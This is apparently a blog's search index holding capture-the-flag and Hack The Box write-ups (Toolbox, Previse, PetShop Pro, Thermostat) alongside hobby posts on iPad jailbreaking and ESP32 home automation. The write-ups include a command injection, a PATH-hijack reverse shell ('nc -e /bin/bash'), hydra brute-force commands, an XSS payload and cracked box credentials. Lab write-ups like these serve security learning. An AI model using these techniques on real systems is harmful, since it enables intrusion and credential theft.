groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768 :/ $ from the original nmap I saw port 5555 filtered, running netstat on the host I see it running :/ $ netstat -na|grep 5555 tcp6 0 0 :::5555 :::* LISTEN :/ $ and adb normally runs as system, to access port 5555 on the device I can do an SSH port forward ssh kristi@10.10.10.247 -L 5555:localhost:5555 -p 2222 in another local shell session I run adb connect localhost:5555 adb shell \u256d\u2500[us-fort-1]-[10.10.14.15]-[triki@parrot]-[~/HTB/boxes/toolbox] \u2570\u2500 $ adb connect localhost:5555 connected to localhost:5555 \u256d\u2500[us-fort-1]-[10.10.14.15]-[triki@parrot]-[~/HTB/boxes/toolbox] \u2570\u2500 $ adb shell x86_64:/ $ id uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0 x86_64:/ $![d46e2df7d3e5e45fc28ab9903bdc7084.png](:/b68099ad3ec54c87a531deacfce28035) as the shell user I type su and become root 1|x86_64:/ $ su :/ # id uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0 :/ # then I run the find command to locate the root.txt file 1|:/ # find / -type f -name root.txt 2>/dev/null /data/root.txt 1|:/ # ROOTED","title":"Privesc"},{"location":"HTB/2021-08-05-previse/","text":"This is another Linux box rated as Easy. I will start off with NMAP. Nmap 7.92 scan initiated Fri Sep 17 23:56:22 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/triki/HTB/boxes/Previse/results/10.10.11.104/scans/_full_tcp_nmap.txt -oX /home/triki/HTB/boxes/Previse/results/10.10.11.104/scans/xml/_full_tcp_nmap.xml 10.10.11.104 Nmap scan report for 10.10.11.104 Host is up, received user-set (0.022s latency). Scanned at 2021-09-17 23:56:23 EDT for 277s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4= | 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-title: Previse Login |_Requested resource was login.php |_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) Visiting the pages available I see: Using burp I reviews the history for this site and noticed that the html was provided for accounts.php. I can see the code used to create an account. with this I was able to create own account to sign into the site. There is a page called files with a backup archive I can download. extracting the archive I see a backup of the website the juicey stuff is in config.php Another page points out that the site is using MySQL Looking back at the Files page I see I can upload something :D Inside the login.php is a hash they used, pretty sure I will need this later after I get shell and start poking through the MySQL database with the creds found earlier. Looking through the files I see the logs.php calls python logs.php $output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\"); Looking at the page for this I see file_logs.php Here i pick which delimeter I want, looking at the code, I should be able to use ; to stop the command and conitnue with another like nc to call home for a shell. To accomplish this I will use BURP I get shell ! since I have root mysql creds. I'll use them mysql> select * from accounts \\G select * from accounts \\G *************************** 1. row *************************** id: 1 username: m4lwhere password: $1$\ud83e\uddc2llol$DQpmdvnb7EeuO6UaqRItf. created_at: 2021-05-27 18:18:36 *************************** 2. row *************************** id: 2 username: triki password: $1$\ud83e\uddc2llol$79cV9c1FNnnr7LcfPFlqQ0 created_at: 2021-09-20 02:49:53 *************************** 3. row *************************** id: 3 username: anand123 password: $1$\ud83e\uddc2llol$zedxR3f0qDOtIQcf273bz. created_at: 2021-09-20 16:19:47 *************************** 4. row *************************** id: 4 username: admin password: $1$\ud83e\uddc2llol$79cV9c1FNnnr7LcfPFlqQ0 created_at: 2021-09-20 17:19:59 4 rows in set (0.00 sec) Here I find a hashed password for users on the box. I'll use hashcat to find the passwords. m4lwhere:ilovecody112235! Now I can SSH into the host as m4lwhere . Running sudo -l , I see this user can run a script /opt/scripts/access_backup.sh The script looks like m4lwhere@previse:/var/backups$ cat /opt/scripts/access_backup.sh #!/bin/bash #We always make sure to store logs, we take security SERIOUSLY here #I know I shouldnt run this as root but I cant figure it out programmatically on my account #This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time gzip -c /var/log/apache2/access.log > /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gz gzip -c /var/www/file_access.log > /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_file_access.gz Notice how the gzip is not called with full path, so I can use path manipulation here. I check the current PATH settings, then check where gzip is, next I update the PATH variable and pre-pend my custom path where my gzip script will reside. Inside the /dev/shm/gzip file I put nc -e /bin/bash <my-ip> <port> then I make the file executable, setup a nc listener on my host and call the access_backups.sh file ROOTED.","title":"2021 08 05 previse"},{"location":"hackerone/2020-04-08-petshop-pro/","text":"Difficulty (easy) Let's walkthrough PetShop Pro. We start off with a simple ecomm site with a simple cart setup. There are 3 flags for this CTF. Flag 1 Shopping Cart First thing i check is to see is there is anything on the checkout page. So I add an item and proceed to checkout. I want to see if there are any hidden fields on the web page so I enable firefox Inspector tool. here I see a hidden field: Here I see a hardcoded price \"8.95\", let's see if we can change that to \"0.00\" and checkout. Yes, the page allows us to proceed and checkout with the balance of $0.00. Not good for the site owner, but good for me, I get a free kitty !! Flag #1 done Flag 2 Admin Panel This site has to have an Admin Panel. Wfuzz can be used to brute force this, but I got $%@! lucky and guessed /login and came upon this screen. Here is decided to use hydra to brude for this in 2 parts. 1. Find valid Username 2. Find the user password. To find the information used for Hydra I used Burp to capture an HTTP Post login request. In Burp you can see the response to get the correct Error the page displays. [ root@kalima/opt/htb/boxes ] $ hydra -f -L /usr/share/wordlists/usernames.txt -p admin 34 .74.105.127 http-post-form \"/9c951cb4b9/login:username=^USER^&password=^PASS^:Invalid username\" -t 50 Hydra v9.0 ( c ) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra ( https://github.com/vanhauser-thc/thc-hydra ) starting at 2020 -03-09 16 :38:58 [ WARNING ] Restorefile ( you have 10 seconds to abort... ( use option -I to skip waiting )) from a previous session found, to prevent overwriting, ./hydra.restore [ DATA ] max 50 tasks per 1 server, overall 50 tasks, 86771 login tries ( l:86771/p:1 ) , ~1736 tries per task [ DATA ] attacking http-post-form://34.74.105.127:80/9c951cb4b9/login:username = ^USER^ & password = ^PASS^:Invalid username 1 [ STATUS ] 7683 .00 tries/min, 7683 tries in 00 :01h, 79088 to do in 00 :11h, 50 active [ STATUS ] 7744 .00 tries/min, 23232 tries in 00 :03h, 63539 to do in 00 :09h, 50 active [ 80 ][ http-post-form ] host: 34 .74.105.127 login: kylie password: admin [ STATUS ] attack finished for 34 .74.105.127 ( valid pair found ) 1 of 1 target successfully completed, 1 valid password found Hydra ( https://github.com/vanhauser-thc/thc-hydra ) finished at 2020 -03-09 16 :44:55 Sweet, got a valid user, now lets find the password, I will use hydra again. [ root@kalima/opt/htb/boxes ] $ hydra -f -l kylie -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt 34 .74.105.127 http-post-form \"/9c951cb4b9/login:username=^USER^&password=^PASS^:Invalid password\" -t 50 Hydra v9.0 ( c ) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra ( https://github.com/vanhauser-thc/thc-hydra ) starting at 2020 -03-09 16 :52:14 [ DATA ] max 50 tasks per 1 server, overall 50 tasks, 9999 login tries ( l:1/p:9999 ) , ~200 tries per task [ DATA ] attacking http-post-form://34.74.105.127:80/9c951cb4b9/login:username = ^USER^ & password = ^PASS^:Invalid password [ 80 ][ http-post-form ] host: 34 .74.105.127 login: kylie password: kristin [ STATUS ] attack finished for 34 .74.105.127 ( valid pair found ) 1 of 1 target successfully completed, 1 valid password found Hydra ( https://github.com/vanhauser-thc/thc-hydra ) finished at 2020 -03-09 16 :52:38 kylie:kristin Now I have a user and password, time to login. Flag #2 done Flag 3 XSS Editing one of the items we are presented with a web form, lets see if it's vulnerable to XSS I will test by adding to Name and Description fields. < img src = x onerror = alert(1) > After saving, I went to the main page where I was prompt with a popup, woohoo, good sign, next I went to the checkout page to see this. Flag #3 done","title":"PetShop Pro Write-up"},{"location":"hackerone/2020-04-08-petshop-pro/#difficulty-easy","text":"Let's walkthrough PetShop Pro. We start off with a simple ecomm site with a simple cart setup. There are 3 flags for this CTF. Flag 1 Shopping Cart First thing i check is to see is there is anything on the checkout page. So I add an item and proceed to checkout. I want to see if there are any hidden fields on the web page so I enable firefox Inspector tool. here I see a hidden field: Here I see a hardcoded price \"8.95\", let's see if we can change that to \"0.00\" and checkout. Yes, the page allows us to proceed and checkout with the balance of $0.00. Not good for the site owner, but good for me, I get a free kitty !! Flag #1 done Flag 2 Admin Panel This site has to have an Admin Panel. Wfuzz can be used to brute force this, but I got $%@! lucky and guessed /login and came upon this screen. Here is decided to use hydra to brude for this in 2 parts. 1. Find valid Username 2. Find the user password. To find the information used for Hydra I used Burp to capture an HTTP Post login request. In Burp you can see the response to get the correct Error the page displays. [ root@kalima/opt/htb/boxes ] $ hydra -f -L /usr/share/wordlists/usernames.txt -p admin 34 .74.105.127 http-post-form \"/9c951cb4b9/login:username=^USER^&password=^PASS^:Invalid username\" -t 50 Hydra v9.0 ( c ) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra ( https://github.com/vanhauser-thc/thc-hydra ) starting at 2020 -03-09 16 :38:58 [ WARNING ] Restorefile ( you have 10 seconds to abort... ( use option -I to skip waiting )) from a previous session found, to prevent overwriting, ./hydra.restore [ DATA ] max 50 tasks per 1 server, overall 50 tasks, 86771 login tries ( l:86771/p:1 ) , ~1736 tries per task [ DATA ] attacking http-post-form://34.74.105.127:80/9c951cb4b9/login:username = ^USER^ & password = ^PASS^:Invalid username 1 [ STATUS ] 7683 .00 tries/min, 7683 tries in 00 :01h, 79088 to do in 00 :11h, 50 active [ STATUS ] 7744 .00 tries/min, 23232 tries in 00 :03h, 63539 to do in 00 :09h, 50 active [ 80 ][ http-post-form ] host: 34 .74.105.127 login: kylie password: admin [ STATUS ] attack finished for 34 .74.105.127 ( valid pair found ) 1 of 1 target successfully completed, 1 valid password found Hydra ( https://github.com/vanhauser-thc/thc-hydra ) finished at 2020 -03-09 16 :44:55 Sweet, got a valid user, now lets find the password, I will use hydra again. [ root@kalima/opt/htb/boxes ] $ hydra -f -l kylie -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt 34 .74.105.127 http-post-form \"/9c951cb4b9/login:username=^USER^&password=^PASS^:Invalid password\" -t 50 Hydra v9.0 ( c ) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra ( https://github.com/vanhauser-thc/thc-hydra ) starting at 2020 -03-09 16 :52:14 [ DATA ] max 50 tasks per 1 server, overall 50 tasks, 9999 login tries ( l:1/p:9999 ) , ~200 tries per task [ DATA ] attacking http-post-form://34.74.105.127:80/9c951cb4b9/login:username = ^USER^ & password = ^PASS^:Invalid password [ 80 ][ http-post-form ] host: 34 .74.105.127 login: kylie password: kristin [ STATUS ] attack finished for 34 .74.105.127 ( valid pair found ) 1 of 1 target successfully completed, 1 valid password found Hydra ( https://github.com/vanhauser-thc/thc-hydra ) finished at 2020 -03-09 16 :52:38 kylie:kristin Now I have a user and password, time to login. Flag #2 done Flag 3 XSS Editing one of the items we are presented with a web form, lets see if it's vulnerable to XSS I will test by adding to Name and Description fields. < img src = x onerror = alert(1) > After saving, I went to the main page where I was prompt with a popup, woohoo, good sign, next I went to the checkout page to see this. Flag #3 done","title":"Difficulty (easy)"},{"location":"hackerone/2020-04-08-thermostat/","text":"Difficulty (easy) This challenge starts off with downloading an APK file. After downloading the file, I decided to extract it with apktool. An APK file is a glorified ZIP file, some can just be unzipped but others APKs have been obfuscated, so there is where apktool comes to the rescue. $ apktool d thermostat.apk Results will be a folder called thermostat with the following contents. -rw-r--r-- 1 triki triki 1263 Mar 9 17 :19 AndroidManifest.xml drwxr-xr-x 136 triki triki 4096 Mar 9 17 :19 res drwxr-xr-x 6 triki triki 4096 Mar 9 17 :19 smali drwxr-xr-x 3 triki triki 4096 Mar 9 17 :19 original -rw-r--r-- 1 triki triki 9099 Mar 9 17 :19 apktool.yml This one I cheated, I know that I'm looking for a string with the text FLAG prepended to it, so I just used grep. triki@kalima:~/Downloads/tmp/thermostat \u00bb grep -r '\\^FLAG\\^' * smali/com/hacker101/level11/PayloadRequest.smali: const-string v0, \"^FLAG^4299765e023b2ce0b86427fa5c0f4d9a543e444525529b3739da63f0c19c2aca $FLAG $ \" smali/com/hacker101/level11/PayloadRequest.smali: const-string v0, \"^FLAG^856cd8bfe1105b9464115b1888982bfe35bd1d99aa3ff84f46b270f7a16a3810 $FLAG $ \" But let's go through this properly. The Hints for these flags are: Flag0 -- Found Communication is key Have you looked at what the app is sending to the server? Flag1 -- Found Doesn't the MAC seem interesting? Access to the source code would help Check out the Android Quickstart video from Hacker101 I loaded this APK into Android Studio Emulator for to see what this app is all about. Next I set the emulator to use my local burp proxy to capture traffic. FLAG #0 done. Looking at the http request captured I notice the X-MAC has a base64 encoded string. Decoding this gave me the following: echo 'pByDNlcfSFXha5P/t9zNLg==' | base64 -d 6WHUk.% When I grep for 'X-MAC' it appears in a file called 'PayloadRequest.smali'. Looking through that file for X-MAC I find the other FLAG. FLAG #1 done.","title":"H1 Thermostat Write-up"},{"location":"hackerone/2020-04-08-thermostat/#difficulty-easy","text":"This challenge starts off with downloading an APK file. After downloading the file, I decided to extract it with apktool. An APK file is a glorified ZIP file, some can just be unzipped but others APKs have been obfuscated, so there is where apktool comes to the rescue. $ apktool d thermostat.apk Results will be a folder called thermostat with the following contents. -rw-r--r-- 1 triki triki 1263 Mar 9 17 :19 AndroidManifest.xml drwxr-xr-x 136 triki triki 4096 Mar 9 17 :19 res drwxr-xr-x 6 triki triki 4096 Mar 9 17 :19 smali drwxr-xr-x 3 triki triki 4096 Mar 9 17 :19 original -rw-r--r-- 1 triki triki 9099 Mar 9 17 :19 apktool.yml This one I cheated, I know that I'm looking for a string with the text FLAG prepended to it, so I just used grep. triki@kalima:~/Downloads/tmp/thermostat \u00bb grep -r '\\^FLAG\\^' * smali/com/hacker101/level11/PayloadRequest.smali: const-string v0, \"^FLAG^4299765e023b2ce0b86427fa5c0f4d9a543e444525529b3739da63f0c19c2aca $FLAG $ \" smali/com/hacker101/level11/PayloadRequest.smali: const-string v0, \"^FLAG^856cd8bfe1105b9464115b1888982bfe35bd1d99aa3ff84f46b270f7a16a3810 $FLAG $ \" But let's go through this properly. The Hints for these flags are: Flag0 -- Found Communication is key Have you looked at what the app is sending to the server? Flag1 -- Found Doesn't the MAC seem interesting? Access to the source code would help Check out the Android Quickstart video from Hacker101 I loaded this APK into Android Studio Emulator for to see what this app is all about. Next I set the emulator to use my local burp proxy to capture traffic. FLAG #0 done. Looking at the http request captured I notice the X-MAC has a base64 encoded string. Decoding this gave me the following: echo 'pByDNlcfSFXha5P/t9zNLg==' | base64 -d 6WHUk.% When I grep for 'X-MAC' it appears in a file called 'PayloadRequest.smali'. Looking through that file for X-MAC I find the other FLAG. FLAG #1 done.","title":"Difficulty (easy)"},{"location":"iOS/2022-02-11-Ipad2-jailbreak/","text":"My iPad is a version 2 from 2012, running 9.3.5. After some reading I found that there is a Jailbreak exploit for 9.3.5(Phoenix), but this is tethered, which means I need to JB after every reboot. More reading finds that I can down grade to 8.4.1 which happens to run faster than 9.3.5 and allows for persistant JB after reboots. Starting off with a fresh wipe and flash the 9.3.5 firmware to start clean. Next I had to change the DNS I used as my AdBlock was stopping Cydia from being installed. Sideload Phoenix.ipa with Sideloady Run Phoenix to Prepare iPad for JailBreak, running the first time we need to Settings - Device Management , click on your account, and select Trust account-name Run Phoenix again to perform the Jailbreak. Go into Cydia and install Filza Now we modify a file to trick the iPad into thinking it's version 6 instead of 9.3.5 so it will upgrade to 8.4.1 In Filza browse to System > Library > CoreServices Open up the file named SystemVersion.plist Update the following, ProductVersion = 6.0 and ProductBuildVersion = 10A403 , you can find the correct code here ipsw.me . Search for your device then the firmware version you want. Save the file and reboot the iPad Once rebooted, go into Settings > About and check the version on the iPad it should say 6.0 Now Check for an update and downgrade to 8.4.1 Now we need to do a full wipe to create cache files required for 8.3.5 before we JailBreak. Without this Jailbreak will fail at 40% complaining about missing files(cache). Before installing make sure to remove ADBlocker Now download etasonJB-RC5 and sideload it with sideloady After installed open up the app and click \"Etason JB!\" and wait :) NOTES: DFU Mode. To get into this, with iPad powered off, Hold the Home button and power on device or plug into computer, and restore from iTunes.","title":"Ipad 2 Jailbreak"},{"location":"iOS/2022-03-12-hackintosh/","text":"To download apple OS you can use gibMacOS . For best results I followed the Dortania documents to build this.","title":"Hackintosh"},{"location":"mc/2020-04-19-esp32-presence-ha/","text":"I have been using HomeAssistant for a couple years now to automate some smalls things in my life. One of the automations was to turn off my PC monitors and office lights when I wasn't in the room. I started off with a Hue motion sensor which worked well, until I don't move for a duration of time and the lights go off. Very annoying !! Recently I came across this project called ESP32-mqtt-room(https://jptrsn.github.io/ESP32-mqtt-room). Diving in, I dug out 3 ESP32 boards I had(one for office and one for mancave), and programmed the project to my first board to be the BLE receiver for my Office. Flashing the firmware was straight forward,I used VSCode with PlatformIO to program the EPS32, but first I had to modify the Settings.h file with my wifi SSID and passphrase along with some MQTT parameters. //Replace with your Wifi SSID; example: #define ssid \"MyWifi\" #define ssid \"$SSID$\" //Replace with your Wifi password; example: #define password \"12345678\" #define password \"$PASS$\" //Replace with a human-friendly host name. Must not contain spaces or special characters and be unique on your network #define hostname \"OfficePresence\" //Replace with your MQTT Broker address; example: #define mqttHost IPAddress(192, 168, 1, 195) #define mqttHost IPAddress(10 10, 10, 24) //Replace with your MQTT Broker port; example: #define mqttPort 1883 #define mqttPort 1883 //Replace with your MQTT Broker user; example: #define mqttUser \"homeassistant\" #define mqttUser \"$MQTT_USER$\" //Replace with your MQTT Broker password; example: #define mqttPassword \"12345678\" #define mqttPassword \"$MQTT_PASS$\" //Replace with the room name where the node will be placed; example: #define room \"living-room\" #define room \"Office\" //Specify the LED pin. For most dev boards, this is GPIO2 #define LED_BUILTIN 2 // Logic level for turning the led on. Most boards use active low, meaning LED_ON should be set to 0 #define LED_ON 0 //Define the base topic for room detection. Usually \"room_presence\" #define channel \"room_presence\" //Define the topic for publishing availability #define availabilityTopic \"presence_nodes/\" room //Define the topic for publishing JSON attributes #define telemetryTopic \"presence_nodes/\" hostname \"/tele\" // Define bluetooth scan parameters #define scanInterval 5 // Define the interval in seconds between scans #define singleScanTime 5 // Define the duration of a single scan in seconds #define activeScan true // Active scan uses more power, but get results faster #define bleScanInterval 0x80 // Used to determine antenna sharing between Bluetooth and WiFi. Do not modify unless you are confident you know what you're doing #define bleScanWindow 0x10 // Used to determine antenna sharing between Bluetooth and WiFi. Do not modify unless you are confident you know what you're doing // Maximum distance (in meters) to report. Devices that are calculated to be further than this distance in meters will not be reported #define maxDistance 2 // MQTT topic for sensor values from HTU21D temperature and humidity sensor //#define htuSensorTopic \"presence_nodes/\" hostname \"/sensor\" Next I added this sensor to HomeAsssitant to make sure it sees the BLE receiver which it does. Now I need a iBeacon transmitter. As the project page suggests a couple options like installing an Android app to act as a iBeacon, I found Android ended up killing the background process and I lost connection. I decided to use one of the ESP32's as a iBeacon. Looking through the example code in the Arduino IDE, I found one called BLE iBeacon . /* Based on Neil Kolban example for IDF: https://github.com/nkolban/esp32-snippets/blob/master/cpp_utils/tests/BLE%20Tests/SampleScan.cpp Ported to Arduino ESP32 by pcbreflux */ /* Create a BLE server that will send periodic iBeacon frames. The design of creating the BLE server is: 1. Create a BLE Server 2. Create advertising data 3. Start advertising. 4. wait 5. Stop advertising. 6. deep sleep */ #include \"sys/time.h\" #include \"BLEDevice.h\" #include \"BLEUtils.h\" #include \"BLEBeacon.h\" #include \"BLEServer.h\" #include \"esp_sleep.h\" #include \"sys/time.h\" #define GPIO_DEEP_SLEEP_DURATION 10 // sleep x seconds and then wake up RTC_DATA_ATTR static time_t last ; // remember last boot in RTC Memory RTC_DATA_ATTR static uint32_t bootcount ; // remember number of boots in RTC Memory #ifdef __cplusplus extern \"C\" { #endif uint8_t temprature_sens_read (); //uint8_t g_phyFuns; #ifdef __cplusplus } #endif // See the following for generating UUIDs: // https://www.uuidgenerator.net/ BLEAdvertising * pAdvertising ; struct timeval now ; #define BEACON_UUID \"cfd9353e-3187-4e2e-882e-37a587422830\" // UUID 1 128-Bit (may use linux tool uuidgen or random numbers via https://www.uuidgenerator.net/) void setBeacon () { BLEBeacon oBeacon = BLEBeacon (); oBeacon . setManufacturerId ( 0x4C00 ); // fake Apple 0x004C LSB (ENDIAN_CHANGE_U16!) oBeacon . setProximityUUID ( BLEUUID ( BEACON_UUID )); oBeacon . setMajor (( bootcount & 0xFFFF0000 ) >> 16 ); oBeacon . setMinor ( bootcount & 0xFFFF ); BLEAdvertisementData oAdvertisementData = BLEAdvertisementData (); BLEAdvertisementData oScanResponseData = BLEAdvertisementData (); oAdvertisementData . setFlags ( 0x04 ); // BR_EDR_NOT_SUPPORTED 0x04 std :: string strServiceData = \"\" ; strServiceData += ( char ) 26 ; // Len strServiceData += ( char ) 0xFF ; // Type strServiceData += oBeacon . getData (); oAdvertisementData . addData ( strServiceData ); pAdvertising -> setAdvertisementData ( oAdvertisementData ); pAdvertising -> setScanResponseData ( oScanResponseData ); } void setup () { Serial . begin ( 115200 ); gettimeofday ( & now , NULL ); Serial . printf ( \"start ESP32 %d \\n \" , bootcount ++ ); Serial . printf ( \"deep sleep (%lds since last reset, %lds since last boot) \\n \" , now . tv_sec , now . tv_sec - last ); last = now . tv_sec ; // Create the BLE Device BLEDevice :: init ( \"\" ); // Create the BLE Server // BLEServer *pServer = BLEDevice::createServer(); // <-- no longer required to instantiate BLEServer, less flash and ram usage pAdvertising = BLEDevice :: getAdvertising (); setBeacon (); // Start advertising pAdvertising -> start (); Serial . println ( \"Advertizing started...\" ); delay ( 100 ); pAdvertising -> stop (); Serial . printf ( \"enter deep sleep \\n \" ); esp_deep_sleep ( 1000000L L * GPIO_DEEP_SLEEP_DURATION ); Serial . printf ( \"in deep sleep \\n \" ); } void loop () { } I needed to make a couple changes for this to work. First I had to change the BEACON_UUID, I used the unix command uuidgen to create a random UUID. That was pretty much it at first. After some testing I noticed the sensor wasn't seen after first time. Loading up an Android App called nRF Connect (this allows you to view nearby bluetooth beacons), I noticed that the minor ID was changing on every update. Looking at the arduino example code, I modified the following: Before oBeacon . setMajor (( bootcount & 0xFFFF0000 ) >> 16 ); oBeacon . setMinor ( bootcount & 0xFFFF ); ``` After ``` C ++ oBeacon . setMajor ( 0 ); oBeacon . setMinor ( 3 ); This statically sets the Major and Minor versions which you have to use in HomeAssistant in the device_id. Next I programmed a second recevier to put in my mancave, I would like to control the light in that room with my presence as well. Last step is to write some new flows in Node-Red to create the light automation based on BLE presence apposed to motion detection. After further testing, I found the BeaconScope Android app to be reliable after disabling Power Saver in Android battery Settings.","title":"ESP32 BLE Room Presence with HomeAssistant"},{"location":"mc/2022-01-05-NodeMCU_wifi_deauth_detection/","text":"One day, I was having a conversation about how insecure wifi is and how easily the deauth attack could happen. I did some Googling and found a project that uses a nodeMCU to scan for wifi reset packets and found, HaxxDetector . I then wrote a python script to connect to the serial interface of the nodeMCU and pull the detection count and write it to a CSV file to be imported into Splunk. Project is still WIP as I need to design and print a nice case for this.","title":"Wifi Deauth Dectection with NodeMCU"}]}